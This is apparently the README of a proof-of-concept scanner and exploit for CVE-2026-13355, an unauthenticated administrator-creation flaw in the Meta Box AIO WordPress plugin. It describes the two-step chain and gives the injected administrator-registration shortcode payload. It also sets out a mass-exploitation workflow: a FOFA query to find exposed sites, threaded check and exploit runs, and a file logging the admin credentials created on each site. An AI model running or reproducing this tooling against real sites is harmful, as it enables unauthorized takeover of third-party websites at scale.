# CVE-2026-13355 — Meta Box AIO Unauthenticated Administrator Privilege Escalation

Python 3 proof-of-concept **scanner and exploit** for **[CVE-2026-13355](https://nvd.nist.gov/vuln/detail/CVE-2026-13355)** in the WordPress bundle **Meta Box AIO** (and related **MB Frontend Submission** / **MB User Profile** extensions).

| | |
|---|---|
| **Platform** | WordPress plugin |
| **Component** | Meta Box AIO |
| **Affected** | Meta Box AIO **≤ 3.11.0**; MB Frontend Submission **≤ 4.5.6**; MB User Profile **≤ 3.11.0** |
| **Fixed in** | Meta Box AIO **3.12.0+** (`Form::process()` authorization) |
| **CVSS** | **9.8 Critical** |
| **Auth** | Unauthenticated |
| **CWE** | CWE-269 — Improper Privilege Management |
| **Researcher** | h0xilo (Wordfence) |

## Summary

Chained flaws in two bundled extensions allow unauthenticated **administrator** account creation:

1. **MB Frontend Submission (`mbfs`)** — `rwmb_frontend_field_object_id` overrides the form target without auth; `Form::process()` omits `user_can_edit()`, so attackers can `wp_update_post()` and overwrite **`post_content`** on arbitrary posts/pages.
2. **MB User Profile (`mbup`)** — Injected `[mb_user_profile_register role="administrator" auto_login="true"]` shortcode attributes are trusted without role validation.

**Important:** The exploit chain requires a public **`mbfs`** (frontend submission) form, not login-only **`mbup`** forms. Many FOFA hits only expose `mbup` login/register UI — those are flagged as `plugin_mbup_only`, not exploitable via this chain.

## Requirements

- Python **3.8+**
- `pip install -r requirements.txt`

## Quick start

```bash
pip install -r requirements.txt

# Single target — check (live terminal flow by default)
python poc.py -u https://target.example --mode check

# Mass check (one line per target unless --quiet)
python poc.py --list targets.example.txt --mode check --threads 20

# Single target — exploit (needs mbfs form URL + post ID)
python poc.py -u https://target.example --mode exploit \
  --form-url /contact/ --object-id 12 --verify

# Mass exploit from check output
python poc.py --list candidates.jsonl --mode exploit --threads 5 --verify
```

## FOFA → target list

Example query:

```text
body="/wp-content/plugins/meta-box-aio/"
```

Normalize a FOFA CSV export:

```bash
python fofa_to_list.py -i fofa_export.csv
# writes list.txt + normalized CSV (local only, gitignored)
python poc.py --list list.txt --mode check --threads 20
```

## CLI options

| Option | Description |
|--------|-------------|
| `-u`, `--url` | Single base URL |
| `--list` | URL list, FOFA-normalized CSV (`url` column), or `candidates.jsonl` |
| `--mode` | `check` or `exploit` |
| `--form-url` | Page with `[mb_frontend_form ...]` / `mbfs-form` |
| `--object-id` | Post/page ID for `rwmb_frontend_field_object_id` |
| `--paths` | Extra paths to crawl for frontend forms |
| `--username`, `--email`, `--password` | Registration credentials (exploit) |
| `--shortcode` | Injected `post_content` payload (default admin register shortcode) |
| `--verify` | Confirm via `/wp-admin/` or `wp-login.php` after register |
| `--flow` | Stream one line per target on mass runs (default with `--list`) |
| `--no-flow` | Progress summary only |
| `--quiet`, `-q` | Minimal console output |
| `--threads`, `-j` | Mass concurrency (default 15) |
| `--output` | JSONL log (default `cve_2026_13355_results.jsonl`) |
| `--vuln-list` | Text hits / exploited lines (default `hits.txt` / use `exploited.txt` for exploit) |
| `--candidates-list` | Check metadata JSONL (default `candidates.jsonl`) |

## Output files

| File | Mode | Content |
|------|------|---------|
| `cve_2026_13355_results.jsonl` | both | Full JSON per target |
| `hits.txt` | check | URLs with **`candidate_mbfs`** |
| `candidates.jsonl` | check | `form_url`, `object_id`, version hints |
| `exploited.txt` | exploit | `url\|user\|email\|pass\|oid=…` |

Use **`--vuln-list exploited.txt`** on exploit runs so check hits in `hits.txt` are not overwritten.

## Check `status` values

| Status | Meaning |
|--------|---------|
| `candidate_mbfs` | Plugin present + **MB Frontend Submission** form found (exploit may be possible) |
| `plugin_mbup_only` | Only User Profile login/register forms — **not** this CVE chain |
| `plugin_no_frontend_forms` | Plugin fingerprint, no rwmb frontend forms discovered |
| `patched` | Version above affected range (when readable) |
| `no_plugin` | Meta Box AIO / extensions not detected |

## Exploit notes

- Poison step POSTs `post_content` through an **`mbfs`** form with `?rwmb_frontend_field_object_id=<id>`.
- Success requires the injected shortcode to **render** on the poisoned page (no strip/KSES, patched plugin, wrong form type).
- Contact/newsletter **`mbfs`** forms often lack a real `post_content` field; overwrite may still fail in practice.
- HTTP **403** on POST usually indicates WAF/host blocking.

## Repository layout

```
.
├── poc.py
├── fofa_to_list.py
├── requirements.txt
├── targets.example.txt
├── README.md
├── LICENSE
└── .gitignore
```

Local scan lists and run artifacts (`list.txt`, `fofa*.csv`, `*.jsonl`, `hits*.txt`, …) are in `.gitignore` and should not be committed.

## References

- [NVD — CVE-2026-13355](https://nvd.nist.gov/vuln/detail/CVE-2026-13355)
- [Wordfence advisory](https://www.wordfence.com/threat-intel/vulnerabilities/id/3b7b6e7e-b944-45f8-a6d8-bfd859bec0d1?source=cve)
- [Meta Box AIO changelog](https://metabox.io/plugins/meta-box-aio/changelog/)

## Legal

For **authorized security testing and education** only. You are responsible for compliance with applicable laws and program rules.
